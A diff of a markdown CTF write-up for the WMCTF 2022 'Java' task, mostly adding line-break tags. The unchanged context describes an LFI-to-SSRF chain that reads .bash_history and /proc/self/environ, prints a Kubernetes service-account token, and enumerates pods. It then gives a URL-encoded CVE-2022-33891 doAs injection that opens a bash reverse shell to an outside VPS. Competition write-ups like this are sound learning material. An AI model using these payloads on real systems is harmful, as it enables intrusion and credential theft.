@@ -3,6 +3,7 @@
 WMCTF was a very decent capture the flag competition with very hard and realistic tasks; We spot **23rd position** after 2 sleepless nights, it was a real pleasure to play with **SOter14** team. 
 https://ctftime.org/team/194091
 ## Java - 15 solves (435 points)
+<br/>
 <p align="center">
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/task.png">
 </p> 
@@ -13,7 +14,7 @@ A simple form that sends post request to /file with two params: <br/>
 - VCODE (captcha) and reflects back the result. We don't have source code of the task though.
 
 The first thing I tested is **LFI(Local File Inclusion)** with file protocol file:// in order to read internal files, looks like an entrypoint!<br/>
-I opened a lot of sensitive files and from .bash_history (/home/ctf/.bash_history) I found that the server is running apache tomcat, hence I tried to search for the right path to the source code of the running web app :
+I opened a lot of sensitive files and from .bash_history (/home/ctf/.bash_history) I found that the server is running apache tomcat, hence I tried to search for the right path to the source code of the running web app :<br/>
 <p align="center">
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/source_code.png">
 </p>
@@ -173,7 +174,7 @@ public class IndexController extends HttpServlet {
  
 From linux env file:
  > file:///proc/self/environ
-<p align="center">
+<br/><p align="center">
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/token.png">
 </p><br/>
 
@@ -181,26 +182,26 @@ From linux env file:
 eyJhbGciOiJSUzI1NiIsImtpZCI6Ik1IN0RxS0k3U0xhZ1ljYnk1WkE3WE5Mb2dMcVdLOXh5NXVEdmtfc2lKMWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImN0ZmVyLXRva2VuLXB6NWxtIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImN0ZmVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYjg2ODY0MTgtOWNiOC00MjZiLThkZmQtNTgxM2E1YTVmMTdiIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6Y3RmZXIifQ.JWwKPAYDMYDmqq-jg9Mzmvil-wG33skSqWsS3_zjv1bLGTRMUvP73w_LsLu7ptRJ1iofTbHBrgRyn01sJ2wjG8f-LruNFWwPj0S6zcGnfYlaUfG70lZIA7otXgEb2pCBzdqrxH4n4PR2aAE5wG-p_uoBjwiShrX-ykfxwErJMnwvJ15OQ57Y87QlZllkaYnvXgg3853qQ5ww414dz4UZ1BL7jXlcCjwbivHMifxMvUAL6GJWY-yoA3hJJBMNz5sjgUz71MXs-0wWLczDk5cv4mbXrjE-mCden5er32ifjsWBx6H_1i5JX6lSt3BP7iUxBQVaqLhnBtYR5nQuFADMFg
 ```
 <br/>
-Special thanks to my teammate Raf² for mentionning that this is a Kubernetes related stuff
+Special thanks to my teammate Raf² for mentionning that this is a Kubernetes related stuff <br/>
 <p align="center">
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/auth_k8s.png"><br/>
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/auth_bearer.png"><br/>
 </p>
 
-With that being said, we can **chain the LFI with SSRF** to access /apis endpoint with that token from localhost
+With that being said, we can **chain the LFI with SSRF** to access /apis endpoint with that token from localhost <br/>
 <p align="center">
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/k8s_api_server.png"><br/>
 </p>
 
 > /apis/v1/namespaces
 
-<p align="center">
+<br/><p align="center">
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/namespace.png">
  </p><br/>
 
 > /api/v1/namespaces/ctf/pods/
 
-```
+```javascript
 HTTP/1.1 200 
 Date: Tue, 23 Aug 2022 02:35:08 GMT
 Connection: close
@@ -385,12 +386,12 @@ Well seems that there are few more steps, To sum up: <br>
 - ```"ip": "10.244.0.228"```
 - ```"containerPort": 8080```
 - The ip is incrementing by one every 40 mins
-- The flag hides in that container, we need to chain with RCE !
+- The flag hides in that container, we need to chain with RCE !<br/>
 <p align="center">
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/spark.png">
  </p><br>
 
-Well, it's **CVE-2022-33891** recently found by the security researcher **Kostya Kortchinsky**: https://www.socinvestigation.com/cve-2022-33891-apache-spark-shell-command-injection-detection-response/
+Well, it's **CVE-2022-33891** recently found by the security researcher **Kostya Kortchinsky**: https://www.socinvestigation.com/cve-2022-33891-apache-spark-shell-command-injection-detection-response/ <br/>
 <p align="center">
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/CVE_explained.png">
  </p><br>
@@ -425,7 +426,7 @@ http://10.244.0.230:8080/?doAs=%253bbash%2b-i%2b>%2526%2b/dev/tcp/[personal VPS 
 #### Notes
 - "?doAs=;command" is a **proved alternative** for "?doAs=\`command\`"
 - Ports are filtered and **only port 8888 is allowed as an external port**, so we are restricted to only listen on port 8888 in order to grab rev shell, ngrok won't work though cuz it generates random port. A private vps is a must for solving the chall.
-<p align="center">
+<br/><p align="center">
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/revShell.png"><br/>
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/flag.png"><br/>
 </p>
